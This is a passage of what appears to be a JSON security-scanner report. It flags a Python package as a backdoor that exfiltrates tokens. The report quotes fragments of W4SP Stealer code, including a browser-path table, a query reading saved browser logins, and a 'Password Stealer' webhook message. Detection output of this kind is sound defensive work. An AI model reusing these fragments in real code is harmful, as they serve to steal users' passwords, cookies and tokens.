                      "text": "k])\n    elif \"NationsGlory\" in name or \"Steam\" in name or \"RiotCli\" in name:\n        GamingZip.append([name, lnik])\n    else:\n        OtherZip.append([name, lnik])\n\n\ndef GatherAll():\n    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '\n    browserPaths = [\n        [f\"{roaming}/Opera Software/Opera GX Stable\",               \"opera.exe\",    \"/Local Storage/leveldb\",           \"/\",            \"/Network\",             \"/Local Extension",
                      "markdown": "`k])\n    elif \"NationsGlory\" in name or \"Steam\" in name or \"RiotCli\" in name:\n        GamingZip.append([name, lnik])\n    else:\n        OtherZip.append([name, lnik])\n\n\ndef GatherAll():\n    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '\n    browserPaths = [\n        [f\"{roaming}/Opera Software/Opera GX Stable\",               \"opera.exe\",    \"/Local Storage/leveldb\",           \"/\",            \"/Network\",             \"/Local Extension`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/xolortpdcanegu-0.0.0.tar.gz/xolortpdcanegu-0.0.0.tar/xolortpdcanegu-0.0.0/xolortpdcanegu/__init__.py"
                },
                "region": {
                  "startLine": 772,
                  "startColumn": 24,
                  "endLine": 772,
                  "endColumn": 32,
                  "snippet": {
                    "text": "        # print(data)\n        found = False\n        for l in data:\n            if 'RememberPassword\"\\t\\t\"1\"' in l:\n                found = True\n        if found == False: return\n        name = arg\n",
                    "rendered": {
                      "text": "        # print(data)\n        found = False\n        for l in data:\n            if 'RememberPassword\"\\t\\t\"1\"' in l:\n                found = True\n        if found == False: return\n        name = arg\n",
                      "markdown": "`        # print(data)\n        found = False\n        for l in data:\n            if 'RememberPassword\"\\t\\t\"1\"' in l:\n                found = True\n        if found == False: return\n        name = arg\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/xolortpdcanegu-0.0.0.tar.gz/xolortpdcanegu-0.0.0.tar/xolortpdcanegu-0.0.0/xolortpdcanegu/__init__.py"
                },
                "region": {
                  "startLine": 582,
                  "startColumn": 55,
                  "endLine": 582,
                  "endColumn": 63,
                  "snippet": {
                    "text": "    shutil.copy2(pathC, tempfold)\n    conn = sql_connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT action_url, username_value, password_value FROM logins;\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n",
                    "rendered": {
                      "text": "    shutil.copy2(pathC, tempfold)\n    conn = sql_connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT action_url, username_value, password_value FROM logins;\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n",
                      "markdown": "`    shutil.copy2(pathC, tempfold)\n    conn = sql_connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT action_url, username_value, password_value FROM logins;\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/xolortpdcanegu-0.0.0.tar.gz/xolortpdcanegu-0.0.0.tar/xolortpdcanegu-0.0.0/xolortpdcanegu/__init__.py"
                },
                "region": {
                  "startLine": 490,
                  "startColumn": 121,
                  "endLine": 490,
                  "endColumn": 129,
                  "snippet": {
                    "text": "            \"embeds\": [\n                {\n                    \"title\": \"W4SP | Password Stealer\",\n                    \"description\": f\"**Found**:\\n{ra}\\n\\n**Data:**\\n🔑 • **{PasswCount}** Passwords Found\\n:link: • [w4spPassword.txt]({link})\",\n                    \"color\": 14406413,\n                    \"footer\": {\n                        \"text\": \"@W4SP STEALER\",\n",
                    "rendered": {
                      "text": "            \"embeds\": [\n                {\n                    \"title\": \"W4SP | Password Stealer\",\n                    \"description\": f\"**Found**:\\n{ra}\\n\\n**Data:**\\n🔑 • **{PasswCount}** Passwords Found\\n:link: • [w4spPassword.txt]({link})\",\n                    \"color\": 14406413,\n                    \"footer\": {\n                        \"text\": \"@W4SP STEALER\",\n",
                      "markdown": "`            \"embeds\": [\n                {\n                    \"title\": \"W4SP | Password Stealer\",\n                    \"description\": f\"**Found**:\\n{ra}\\n\\n**Data:**\\n🔑 • **{PasswCount}** Passwords Found\\n:link: • [w4spPassword.txt]({link})\",\n                    \"color\": 14406413,\n                    \"footer\": {\n                        \"text\": \"@W4SP STEALER\",\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/xolortpdcanegu-0.0.0.tar.gz/xolortpdcanegu-0.0.0.tar/xolortpdcanegu-0.0.0/xolortpdcanegu/__init__.py"
                },
                "region": {
                  "startLine": 490,
                  "startColumn": 90,
                  "endLine": 490,
                  "endColumn": 98,
                  "snippet": {
                    "text": "            \"embeds\": [\n                {\n                    \"title\": \"W4SP | Password Stealer\",\n                    \"description\": f\"**Found**:\\n{ra}\\n\\n**Data:**\\n🔑 • **{PasswCount}** Passwords Found\\n:link: • [w4spPassword.txt]({link})\",\n                    \"color\": 14406413,\n                    \"footer\": {\n                        \"text\": \"@W4SP STEALER\",\n",
                    "rendered": {
                      "text": "            \"embeds\": [\n                {\n                    \"title\": \"W4SP | Password Stealer\",\n                    \"description\": f\"**Found**:\\n{ra}\\n\\n**Data:**\\n🔑 • **{PasswCount}** Passwords Found\\n:link: • [w4spPassword.txt]({link})\",\n                    \"color\": 14406413,\n                    \"footer\": {\n                        \"text\": \"@W4SP STEALER\",\n",
                      "markdown": "`            \"embeds\": [\n                {\n                    \"title\": \"W4SP | Password Stealer\",\n                    \"description\": f\"**Found**:\\n{ra}\\n\\n**Data:**\\n🔑 • **{PasswCount}** Passwords Found\\n:link: • [w4spPassword.txt]({link})\",\n                    \"color\": 14406413,\n                    \"footer\": {\n                        \"text\": \"@W4SP STEALER\",\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/xolortpdcanegu-0.0.0.tar.gz/xolortpdcanegu-0.0.0.tar/xolortpdcanegu-0.0.0/xolortpdcanegu/__init__.py"
                },
                "region": {
                  "startLine": 489,
                  "startColumn": 37,
                  "endLine": 489,
                  "endColumn": 45,
                  "snippet": {
                    "text": "            \"content\": globalInfo(),\n            \"embeds\": [\n                {\n                    \"title\": \"W4SP | Password Stealer\",\n                    \"description\": f\"**Found**:\\n{ra}\\n\\n**Data:**\\n🔑 • **{PasswCount}** Passwords Found\\n:link: • [w4spPassword.txt]({link})\",\n                    \"color\": 14406413,\n                    \"footer\": {\n",
                    "rendered": {
                      "text": "            \"content\": globalInfo(),\n            \"embeds\": [\n                {\n                    \"title\": \"W4SP | Password Stealer\",\n                    \"description\": f\"**Found**:\\n{ra}\\n\\n**Data:**\\n🔑 • **{PasswCount}** Passwords Found\\n:link: • [w4spPassword.txt]({link})\",\n                    \"color\": 14406413,\n                    \"footer\": {\n",
                      "markdown": "`            \"content\": globalInfo(),\n            \"embeds\": [\n                {\n                    \"title\": \"W4SP | Password Stealer\",\n                    \"description\": f\"**Found**:\\n{ra}\\n\\n**Data:**\\n🔑 • **{PasswCount}** Passwords Found\\n:link: • [w4spPassword.txt]({link})\",\n                    \"color\": 14406413,\n                    \"footer\": {\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        }
      ],
      "columnKind": "utf16CodeUnits"
    }
  ]
}